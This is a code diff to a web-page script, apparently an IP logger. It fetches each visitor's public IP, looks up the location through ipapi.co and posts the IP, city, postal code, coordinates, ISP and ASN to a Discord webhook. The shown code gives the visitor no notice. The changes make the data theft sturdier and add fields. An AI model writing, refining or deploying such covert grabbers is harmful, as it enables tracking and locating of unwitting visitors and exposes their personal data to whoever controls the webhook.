@@ -9,6 +9,7 @@
         async function getIP() {
             try {
                 let response = await fetch('https://api.ipify.org?format=json');
+                if (!response.ok) throw new Error('Failed to fetch IP');
                 let data = await response.json();
                 console.log('Retrieved IP:', data.ip); // Debug log
                 return data.ip;
@@ -18,10 +19,11 @@
             }
         }
 
-        // Function to get the user's location based on IP
+        // Function to get the user's location based on IP using ipapi
         async function getLocation(ip) {
             try {
-                let response = await fetch(`http://ip-api.com/json/${ip}?fields=ip,country,regionName,city,zip,lat,lon,isp,org,as`);
+                let response = await fetch(`https://ipapi.co/${ip}/json/`);
+                if (!response.ok) throw new Error('Failed to fetch location');
                 let data = await response.json();
                 console.log('Location Data:', data); // Debug log
                 return data;
@@ -37,7 +39,7 @@
             const payload = {
                 embeds: [
                     {
-                        color: 3447003, // Optional color
+                        color: 10354688, // Optional color
                         fields: [
                             {
                                 name: "IP:",
@@ -45,15 +47,18 @@
                             },
                             {
                                 name: "Location:",
-                                value: `Country:\n${data.country || 'N/A'}\n\n` +
-                                       `Region:\n${data.regionName || 'N/A'}\n\n` +
+                                value: `Country:\n${data.country_name || 'N/A'}\n\n` +
+                                       `Region:\n${data.region || 'N/A'}\n\n` +
                                        `City:\n${data.city || 'N/A'}\n\n` +
-                                       `ZIP:\n${data.zip || 'N/A'}\n\n` +
-                                       `Latitude:\n${data.lat || 'N/A'}\n\n` +
-                                       `Longitude:\n${data.lon || 'N/A'}\n\n` +
-                                       `ISP:\n${data.isp || 'N/A'}\n\n` +
-                                       `Organization:\n${data.org || 'N/A'}\n\n` +
-                                       `AS:\n${data.as || 'N/A'}\n\n`
+                                       `ZIP:\n${data.postal || 'N/A'}\n\n` +
+                                       `Latitude:\n${data.latitude || 'N/A'}\n\n` +
+                                       `Longitude:\n${data.longitude || 'N/A'}\n\n` +
+                                       `Timezone:\n${data.timezone || 'N/A'}\n\n` +
+                                       `UTC Offset:\n${data.utc_offset || 'N/A'}\n\n` +
+                                       `Country Capital:\n${data.country_capital || 'N/A'}\n\n` +
+                                       `Currency:\n${data.currency || 'N/A'}\n\n` +
+                                       `ISP:\n${data.org || 'N/A'}\n\n` +
+                                       `AS:\n${data.asn || 'N/A'}\n\n`
                             }
                         ],
                         author: {
@@ -64,14 +69,18 @@
             };
 
             try {
-                await fetch(webhookUrl, {
+                let response = await fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify(payload)
                 });
-                console.log('Data sent to Discord successfully'); // Debug log
+                if (response.ok) {
+                    console.log('Data sent to Discord successfully'); // Debug log
+                } else {
+                    console.error('Failed to send data to Discord. Status:', response.status);
+                }
             } catch (error) {
                 console.error('Error sending to Discord:', error);
             }
@@ -85,15 +94,18 @@
                 if (locationData) {
                     await sendToDiscord({
                         ip: ip,
-                        country: locationData.country,
-                        regionName: locationData.regionName,
+                        country_name: locationData.country_name,
+                        region: locationData.region,
                         city: locationData.city,
-                        zip: locationData.zip,
-                        lat: locationData.lat,
-                        lon: locationData.lon,
-                        isp: locationData.isp,
+                        postal: locationData.postal,
+                        latitude: locationData.latitude,
+                        longitude: locationData.longitude,
+                        timezone: locationData.timezone,
+                        utc_offset: locationData.utc_offset,
+                        country_capital: locationData.country_capital,
+                        currency: locationData.currency,
                         org: locationData.org,
-                        as: locationData.as
+                        asn: locationData.asn
                     });
                 } else {
                     console.error('Failed to retrieve location data.'); // Debug log
